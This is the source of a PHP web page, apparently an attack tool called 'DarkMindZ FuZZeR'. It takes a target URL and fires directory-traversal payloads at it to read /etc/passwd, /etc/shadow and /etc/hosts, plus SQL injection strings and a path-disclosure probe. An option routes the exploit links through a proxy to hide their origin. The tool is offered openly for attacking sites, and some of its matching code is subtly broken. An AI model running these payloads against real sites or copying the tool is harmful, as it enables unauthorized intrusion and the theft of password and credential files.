<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>
<!--
root@darkmindz.com~ cat /home/pr0jects/FuZZ/intro

Title: Fuzzer
Language: PHP
Author: RoMeO[DarkMindZ.com]

Info: PHP.FuZZeR, Make the routine of LFI / RFI / SQL / XSS / Path Disclosures checking go faster, by using this fuzzer.._
      Example of usage: http://www.target.com/index.php?id= / ?page= / ?lol= etc..._
      - Enj0y!

#EOF
root@darkmindz.com~ exit
-->
<head>
<title>DarkMindZ FuZZeR</title>
<style>
body {
	background: #222;
	color:  #d8d8d8;
	font: normal 12 Trebuchet MS;
	text-align: center;
	font-family: Trebuchet MS;
}
.main {
    background: #222;
	color:  #d8d8d8;
	font: normal 12 Trebuchet MS;
	text-align: center;
	font-family: Trebuchet MS;
     margin: 150px 0;
}

form {
	margin: 0px;
	padding: 10px 0px;
	}

form input {
	border: 2px solid #333;
	background: #4B4B4B;
	color: #bbb;
	font-size: 11px;
	padding: 2px;
	margin-bottom: 2px;
	}

form input:focus {
	border: 2px solid #333;
	background: #555;
	color: #fff;
	}

form textarea {
	display: block;
	float: left;
	border: 2px solid #333;
	background: #4B4B4B;
	color: #bbb;
	font-size: 11px;
	padding: 2px;
	margin-bottom: 2px;
	}

form textarea:focus {
	border: 2px solid #222;
	background: #555;
	color: #fff;
	}

form select {
	display: block;
	float: left;
	border: 2px solid #333;
	background: #4B4B4B;
	color: #bbb;
	font-size: 11px;
	padding: 2px;
	margin-bottom: 2px;
	}

form select:focus {
	border: 2px solid #222;
	background: #555;
	color: #fff;
	}
    form input.button {
	height: 20px;
	padding: 0px 5px;
	border: 2px solid #222;
	cursor: pointer;
	font-size: 10px !important;
	width: auto !important;
	color: #222;
	font-weight: bold;
	}
.button {
	height: 20px;
	padding: 0px 5px;
	border: 2px solid #222;
	cursor: pointer;
	font-size: 10px !important;
	width: auto !important;
	color: #222;
	font-weight: bold;
	}
.button:hover {
	color: #bbb;
	}
form input.button:hover {
	color: #bbb;
	}
A {
color:  #555;
font-family: Trebuchet MS;
TEXT-DECORATION: none;
}
A:unknown {
color:  #d8d8d8;
font-family: Trebuchet MS;
TEXT-DECORATION: none;
}
A.Links {
color:  #d8d8d8;
TEXT-DECORATION: none;
}
A.Links:unknown {
color:  #d8d8d8;
TEXT-DECORATION: none;
}
A:hover {
color:  #d8d8d8;
TEXT-DECORATION: bold;
}
</style>
<script language="javascript">
function checkVisibility(name) {
	if (document.getElementById(name).style.display == "none") {
		document.getElementById(name).style.display = "inline"
	} else {
		document.getElementById(name).style.display = "none"
	}
}
function hideVisibility(name) {
	document.getElementById(name).style.display = "none"
}
</script>
</head>
<body>
<br />
<center><strong>[ DarkMindZ FuZZeR v1.0 Beta ]</strong></center>
<div class="main">
<form action='' method='POST'>
<font color="red">Target:</font> <input type='text' size='70' name='target' /><input type='submit' class='button' value='FuZZ!'><br />
<font color="red">Extra Options:</font><br />
 Proxy <input name="pr0xy" type="checkbox"  class="textbox" id="changepr0xy" onClick="javascript:checkVisibility('pr0xy');" value="true" />
 <div id="pr0xy" style="display:none;" />
 <br />
 <input name="pr0xy_ip" value="127.0.0.1" /><span style="bold; font-size:15;">:</span><input name="pr0xy_port" value="8181" />
 </div>
 <br />
  Proxy on exploiting <input name="pr0xyspl0it" type="checkbox"  class="textbox" id="changepr0xyspl0it" onClick="javascript:checkVisibility('pr0xyspl0itz');" value="true" />
 <div id="pr0xyspl0itz" style="display:none;" />
 <br />
 Note: PHProxy's Only Please.
 <br />
 <input name="pr0xyurl" size="60" value="http://www.unbanproxy.info" />
 </div>
 <br />
 Custom User-Agent <input name="changeuseragent" type="checkbox"  class="textbox" id="changeuseragent" onClick="javascript:checkVisibility('useragent');" value="true" />
 <div id="useragent" style="display:none;" />
 <br />
 <input name="new_agent" value="DarkMindZ FuZZeR [ DarkMindZ.com ]" size="60" />
 </div>
 <br />
 Custom Referrer <input name="changeref" type="checkbox"  class="textbox" id="changeref" onClick="javascript:checkVisibility('ref');" value="true" />
 <div id="ref" style="display:none;" />
 <br />
 <input name="new_ref" value="http://www.darkmindz.com" size="60" />
</form>
</div>

<?php
# Needs some improving, but for a beta release, bored while doing it. it is a good job ;P
# To-Do :
# Improve performance
# Add new sploits
# CLI edition
# Email / Text reports.
# file_get_contents, fopen, fread, instead of cURL `for servers with no cURL support...`
# If you have any suggestions / improvements, let me know :] on DarkMindZ.com or romeo.haxxor@gmail.com..

# Target is there, lets attack!
if(isset($_POST['target']))
{

echo "<center><strong>[ <font color='red'>Attack Started</font> ]</strong></center><br />\n\n";

$url = $_POST['target']; # Save the target as $url.

$curl = curl_init();     # Start cURL, it will be used to get contents of webpage.

$newagent = $_POST['changeuseragent']; # checking if a custom useragent is needed

$changeagent = $_POST['new_agent']; # the new agent.

if($newagent)
{
$user_agent = $changeagent;
} else {
$user_agent = "DarkMindZ FuZZeR [ DarkMindZ.com ]";
}

curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);  # tell cURL to use $user_agent as a useragent.

$newref = $_POST['changeref'];  # check if a custom refferer is needed.

$changeref = $_POST['new_ref'];  # the custom ref.

if($newref)
{
$referer = $changeref;
} else {
$referer = "http://www.darkmindz.com";
}

curl_setopt($curl, CURLOPT_REFERER, $referer);   # tell cURL to use $referer as a ref.

$pr0xy = $_POST['pr0xy'];  # check if proxy is needed.

$newpr0xy = $_POST['pr0xy_ip'] . ':' . $_POST['pr0xy_port'];    # proxy:port

if($pr0xy)
{
curl_setopt($curl, CURLOPT_PROXY, $newpr0xy);   # tell cURL to use $newpr0xy as a proxy
}

$pr0xyspl0it = $_POST['pr0xyspl0it']; # check if we need a phproxy on sploiting

$newpr0xyspl0it = $_POST['pr0xyurl']; # the proxy url

$usepr0xysploit = FALSE; # default is false..

if($pr0xyspl0it)
{
$usepr0xysploit = TRUE; $tehpr0xy = $newpr0xyspl0it . "/q="; # set the proxy URL.

}

#############[START_ROUTINE]#############
#############[ATTACK_1]#################
$target = $url."../../../../../../../../../../../../../../etc/passwd";   # Try to get /etc/passwd, we go back enough dirs `../../` for most webservers.
echo "[<font color='red'>+</font>] Attacking /etc/passwd....<br />\n\n";
curl_setopt($curl, CURLOPT_URL, $target);    # Tell cURL the target is $url ++ the exploit.
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);  # Tell cURL to return the source code of page.
   $return = curl_exec($curl); # Execute cURL
if($usepr0xysploit) { $target = $tehpr0xy.base64_encode($target); }
 if(eregi("root", $return))   # Check, if `root` is anywhere on the page. there is a high possiblity it is vul to LFI.
   {
	echo "[<font color='red'>-</font>] <blink>LFI Found.</blink> \n\n<br />";
	echo "<a href='".$target."' target='_blank'>[ Spl0itZ ]</a>\n\n<br />";
   }
#############[/ATTACK_1]##############
#############[ATTACK_2]###############
$target = $url."../../../../../../../../../../../../../../etc/passwd%00";
echo "[<font color='red'>+</font>] Attacking /etc/passwd%00....<br />\n\n";
curl_setopt($curl, CURLOPT_URL, $target);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
   $return = curl_exec($curl);
if($usepr0xysploit) { $target = $tehpr0xy.base64_encode($target); }
 if(eregi("root", $return))
   {
	echo "[<font color='red'>-</font>] <blink>LFI Found.</blink> \n\n<br />";
	echo "<a href='".$target."' target='_blank'>[ Spl0itZ ]</a>\n\n<br />";
   }
#############[/ATTACK_2]###############
#############[ATTACK_3]##############
$target = $url."../../../../../../../../../../../../../../etc/shadow";
echo "[<font color='red'>+</font>] Attacking /etc/shadow....<br />\n\n";
curl_setopt($curl, CURLOPT_URL, $target);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
   $return = curl_exec($curl);
if($usepr0xysploit) { $target = $tehpr0xy.base64_encode($target); }
 if(eregi("root", $return))
   {
	echo "[<font color='red'>-</font>] <blink>LFI Found.</blink> \n\n<br />";
	echo "<a href='".$target."' target='_blank'>[ Spl0itZ ]</a>\n\n<br />";
   }
#############[/ATTACK_3]##############
#############[ATTACK_4]##############
$target = $url."../../../../../../../../../../../../../../etc/shadow%00";
echo "[<font color='red'>+</font>] Attacking /etc/shadow%00....<br />\n\n";
curl_setopt($curl, CURLOPT_URL, $target);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
   $return = curl_exec($curl);
if($usepr0xysploit) { $target = $tehpr0xy.base64_encode($target); }
 if(eregi("root", $return))
   {
	echo "[<font color='red'>-</font>] <blink>LFI Found.</blink> \n\n<br />";
	echo "<a href='".$target."' target='_blank'>[ Spl0itZ ]</a>\n\n<br />";
   }
#############[/ATTACK_4]##############
#############[ATTACK_5]##############
$target = $url."../../../../../../../../../../../../../../etc/hosts";
echo "[<font color='red'>+</font>] Attacking /etc/hosts....<br />\n\n";
curl_setopt($curl, CURLOPT_URL, $target);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
   $return = curl_exec($curl);
if($usepr0xysploit) { $target = $tehpr0xy.base64_encode($target); }
 if(eregi("root", $return))
   {
	echo "[<font color='red'>-</font>] <blink>LFI Found.</blink> \n\n<br />";
	echo "<a href='".$target."' target='_blank'>[ Spl0itZ ]</a>\n\n<br />";
   }
#############[/ATTACK_5]##############
#############[ATTACK_6]##############
$target = $url."../../../../../../../../../../../../../../etc/hosts%00";
echo "[<font color='red'>+</font>] Attacking /etc/hosts%00....<br />\n\n";
curl_setopt($curl, CURLOPT_URL, $target);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
   $return = curl_exec($curl);
if($usepr0xysploit) { $target = $tehpr0xy.base64_encode($target); }
 if(eregi("root", $return))
   {
	echo "[<font color='red'>-</font>] <blink>LFI Found.</blink> \n\n<br />";
	echo "<a href='".$target."' target='_blank'>[ Spl0itZ ]</a>\n\n<br />";
   }
#############[/ATTACK_6]##############
#############[ATTACK_7]##############
$target = $url."--";
echo "[<font color='red'>+</font>] Simple SQL Injection....<br />\n\n";
curl_setopt($curl, CURLOPT_URL, $target);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
   $return = curl_exec($curl);
if($usepr0xysploit) { $target = $tehpr0xy.base64_encode($target); }
 if(eregi(array("MySQL", "on line", "mysq_query()"), $return))
   {
	echo "[<font color='red'>-</font>] <blink>SQL Injection Found.</blink> \n\n<br />";
	echo "<a href='".$target."' target='_blank'>[ Spl0itZ ]</a>\n\n<br />";
   }
#############[/ATTACK_7]##############
#############[ATTACK_8]##############
$target = $url."-- OR a=a/*";
echo "[<font color='red'>+</font>] Simple SQL Injection....<br />\n\n";
curl_setopt($curl, CURLOPT_URL, $target);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
   $return = curl_exec($curl);
if($usepr0xysploit) { $target = $tehpr0xy.base64_encode($target); }
 if(eregi(array("MySQL", "on line", "mysq_query()"), $return))
   {
	echo "[<font color='red'>-</font>] <blink>SQL Injection Found.</blink> \n\n<br />";
	echo "<a href='".$target."' target='_blank'>[ Spl0itZ ]</a>\n\n<br />";
   }
#############[/ATTACK_8]##############
#############[ATTACK_9]##############
$url1 = str_replace("=", "", $url);
$target = $url1."[]=darkmindz.com";
echo "[<font color='red'>+</font>] Path Disclosure....<br />\n\n";
curl_setopt($curl, CURLOPT_URL, $target);
curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
   $return = curl_exec($curl);
if($usepr0xysploit) { $target = $tehpr0xy.base64_encode($target); }
 if(eregi(array("Fatal", "on line", "Error"), $return))
   {
	echo "[<font color='red'>-</font>] <blink>Path Disclosure.</blink> \n\n<br />";
	echo "<a href='".$target."' target='_blank'>[ Spl0itZ ]</a>\n\n<br />";
   }
#############[/ATTACK_9]##############

curl_close($curl); # bai!

}

?>
</div>
<center><small>[&nbsp;<b><a href='http://www.darkmindz.com'>DarkMindZ.com</a> - <i>Think Dark</i> || <a href="http://www.thedefaced.org">TheDefaced.org</a></b>&nbsp;]</small></center>
</body>
</html>
<?php
exit; # incase we are included in a RFI ;]
?>



